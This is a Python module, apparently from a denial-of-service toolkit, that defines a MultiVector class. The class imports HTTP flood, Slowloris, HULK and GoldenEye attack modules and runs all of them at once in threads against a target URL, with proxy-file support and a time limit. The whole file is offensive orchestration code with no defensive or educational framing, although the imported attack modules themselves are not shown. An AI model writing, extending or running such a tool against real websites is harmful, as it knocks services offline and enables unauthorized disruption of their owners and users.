import threading
import time

class MultiVector:
    def __init__(self, url, threads=500, sockets=1000, duration=0, proxy_file=None, stats=None):
        self.url = url
        self.threads = threads // 4
        self.sockets = sockets // 4
        self.duration = duration
        self.proxy_file = proxy_file
        self.stats = stats
        self.running = False
    
    def attack(self):
        """Launch multiple attack types simultaneously"""
        self.running = True
        
        # Import attacks
        from modules.attacks.http_flood import HTTPFlood
        from modules.attacks.slowloris import Slowloris
        from modules.attacks.hulk import HULK
        from modules.attacks.goldeneye import GoldenEye
        
        attacks = [
            HTTPFlood(self.url, self.threads, self.sockets, self.duration, self.proxy_file, self.stats),
            Slowloris(self.url, self.threads, self.sockets, self.duration, self.proxy_file, self.stats),
            HULK(self.url, self.threads, self.sockets, self.duration, self.proxy_file, self.stats),
            GoldenEye(self.url, self.threads, self.sockets, self.duration, self.proxy_file, self.stats),
        ]
        
        threads = []
        for atk in attacks:
            t = threading.Thread(target=atk.attack, daemon=True)
            t.start()
            threads.append(t)
        
        start = time.time()
        while self.running:
            if self.duration > 0 and (time.time() - start) > self.duration:
                break
            time.sleep(1)
        
        self.running = False
